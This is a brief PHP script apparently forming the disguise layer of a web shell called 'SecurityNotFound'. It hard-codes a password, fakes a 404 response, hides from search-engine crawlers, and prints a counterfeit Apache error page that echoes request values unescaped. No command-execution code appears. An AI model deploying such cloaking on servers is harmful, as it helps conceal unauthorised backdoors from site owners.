<?php

  /* Metadata
  >>>>>>>>>>>>>>>>> */
  define('__NAME__', 'SecurityNotFound');
  define('__AUTHOR__', '@CosasDePuma');

  /* Variables
  >>>>>>>>>>>>>>>>> */
  define('password', 'cosasdepuma');

  /* Headers
  >>>>>>>>>>>>>>>>> */
  header('HTTP/1.0 404 Not Found');
  header('X-Powered-By: Unicorns and kitties <3');

  /* Robots
  >>>>>>>>>>>>>>>>> */
  $robots = array(
    'Google', 'Yandex', 'MSNBot', 'Slurp', 'Rambler', 'ia_archiver'
  );

  foreach($robots as $robot)
    if( strpos($_SERVER['HTTP_USER_AGENT'],$robot) !== false )
      exit;

  /* Functions
  >>>>>>>>>>>>>>>>> */
  function ApacheNotFound() {
    ?>

    <h1>Not Found</h1>
    <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
    <hr>
    <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>

    <?php exit;
  }

  ApacheNotFound();
?>